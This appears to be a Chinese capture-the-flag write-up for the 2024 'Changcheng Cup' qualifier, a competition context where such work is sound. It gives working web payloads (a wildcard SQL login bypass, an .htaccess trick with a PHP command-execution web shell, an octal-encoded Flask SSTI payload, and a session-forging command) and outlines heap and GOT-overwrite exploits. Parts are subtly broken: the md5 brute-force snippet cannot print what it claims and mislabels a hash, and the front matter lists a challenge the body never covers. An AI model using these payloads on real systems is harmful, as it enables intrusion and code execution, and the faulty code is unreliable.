---
title: 2024 年第四届"长城杯"网络安全大赛（初赛）Writeup
contest: 长城杯
year: 2024
difficulty: hard
vuln_type: [sqli, file_upload, rce, web_unknown, ssti, pwn_unknown, stego_traffic]
tags: [SQL 通配符登录 %%, .htaccess 解析 jpg, tac SUID 提权, Flask session 伪造, 原型链污染, SSTI 字母限制 octal, 数字 md5 爆破, UAF __malloc_hook, one_gadget, cJSON Parse 栈溢出 任意地址写, free_got 改 system]
attack_chain: 1. SQLUP: %% 通配符登录 → 上传 .htaccess (AddType php) + 1.jpg (<?php system) → tac 读 flag (sudo) / 2. CandyShop: flask secret=a123456 爆破 → 伪造 session sold>857 → /admin/view_inventory 模板渲染 + 字母限制 → 八进制 SSTI (octal str \137\137...) 读 secret.txt → 原型链污染 / 3. FlowerShop: 买 2 影星玫瑰+1 卡布奇诺 → 整数溢出改金币 → pop rdi + ret + system("/bin/sh") / 4. consumption: cJSON_Parse 栈溢出覆盖 v13 → 任意地址写 → printf_got 写 heap[1] → show 泄露 libc → edit free_got 改 system → free chunk0 / 5. Kylin_Heap: UAF + unsorted bin 泄露 libc + tcache UAF 改 __malloc_hook 为 one_gadget
key_payload: username=admin&password=%% ; .htaccess: AddType application/x-httpd-php .xxx ; flask-unsign --sign --cookie "{'identity': 'admin', 'sold': 857, '__init__': {'__globals__': {'sold': 857}}}" --secret a123456 ; system("/bin/sh") via ret2libc ; one_gadget 0xe6c81
one_liner: SQL %% + .htaccess + 数字 md5 爆破 + 原型链污染 + SSTI 八进制 + pwn 3 题。
lesson: 数字 md5（如 0cc175b9c0f1b6a831c399e269772661 = md5('a')）是单字节爆破关键；Flask secret 弱密钥爆破可伪造 session。
quality: high
---
# 2024 年第四届"长城杯"网络安全大赛（初赛）

## Web

### 1. SQLUP（SQL 通配符 + .htaccess 解析）

```python
# MySQL LIKE 通配符
username = 'admin'
password = '%%'  # 任意字符匹配
# 登录后台 → 上传 .htaccess 解析 1.jpg 为 php
# .htaccess: AddType application/x-httpd-php .xxx
# 1.jpg: <?php system($_GET['cmd']);
# 限制 p 字符: 'tac' 替代 'cat'
?cmd=tac /flag
```

### 2. CandyShop（Flask session 伪造 + SSTI）

```python
# 1. flask secret 爆破 → 'a123456'
# 2. 伪造 session 让 sold > 500 触发 read secret.txt
# 3. /admin/view_inventory 有模板渲染 + 字母限制 [a-zA-Z_]
# 4. SSTI 用八进制 \137\143\154\141\163\163 绕过

# 八进制 SSTI payload
payload = """
{{ ''['\137\137\143\154\141\163\163\137\137']
        ['\137\137\142\141\163\145\163\137\137'][0]
        ['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()
        [133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']
        ['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']
        ('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051')
}}
"""

# flask-unsign 工具签名
flask-unsign --sign --cookie "{'identity': 'admin', 'username': 'test3', '__init__': {'__globals__': {'sold': 857, 'inventory': '<SSTI>'}}}" --secret 'a123456'
```

### 3. consumption (Pwn - cJSON 栈溢出)

```python
# cJSON_Parse 栈溢出覆盖 v13 → heap[1] 写 printf_got 地址
# show(1) 泄露 printf libc 地址
# edit(1) 改 free_got 为 system
# free(0) 释放 /bin/sh chunk → getshell
```

### 4. Kylin_Heap (Pwn - UAF + tcache)

```python
# 申请大 chunk 释放入 unsorted bin → show 泄露 libc
# 申请 0x10 chunk 释放入 tcache → tcache UAF 改 __malloc_hook
# one_gadget 0xe6c81 → 任意 malloc 触发
```

## Misc

### 5. BrickGame

玩三关小游戏拿 flag 或伪造成功包。

### 6. 漏洞探踪

```python
# 阶段一：oa.access.log → 提取 IP 192.168.30.234
# 阶段二：192.168.1.5/key → bdb8e21eace81d5fd21ca445ccb35071
# 192.168.1.5/raw → bdb8e21e...7115a76f6751...
# RC4 key=bdb8e21e...071 解密
```

### 7. 最安全的加密方式

```python
# 盲猜出题失误，flag 是数字 md5
import hashlib
md5_map = {'8fa14cdd754f91cc6554c9e71929cce7': '0', ...}
# 爆破单字节字符的 md5
for c in '0123456789':
    if hashlib.md5(c.encode()).hexdigest() == '0cc175b9c0f1b6a831c399e269772661':
        print(c)  # 'a'
```

数字 md5 → 数字/字符爆破。
